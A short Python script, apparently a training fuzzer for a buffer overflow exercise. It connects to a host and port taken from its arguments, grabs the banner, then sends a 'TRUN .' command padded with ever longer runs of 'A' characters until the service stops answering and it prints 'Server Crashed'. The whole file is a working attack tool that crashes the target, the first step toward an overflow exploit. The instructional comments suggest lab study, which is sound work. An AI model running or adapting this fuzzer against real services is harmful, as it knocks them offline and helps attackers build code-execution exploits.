import socket
import sys

ip=sys.argv[1]
port=int(sys.argv[2])

#AF_INET -> IPv4
#SOCK_STREAM -> TCP Connection (SOCK_DGRAM -> UDP)
#Constructor
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#initiate the connection
sock.connect((ip, port))
sock.settimeout(5)

#Grab the banner out of socket and print it
#.decode() -> convert binary data into ascii (gets rid of the b'')
data = sock.recv(4096).decode()
print(data)

try:
	for i in range(1,2500):
		print("Trying length: " + str(i))
		sock.send( ("TRUN ." + "A"*i).encode() )
		data = sock.recv(4096).decode()
		print(data)
except Exception as E:
	print(E)
	print("Server Crashed")

sock.close()
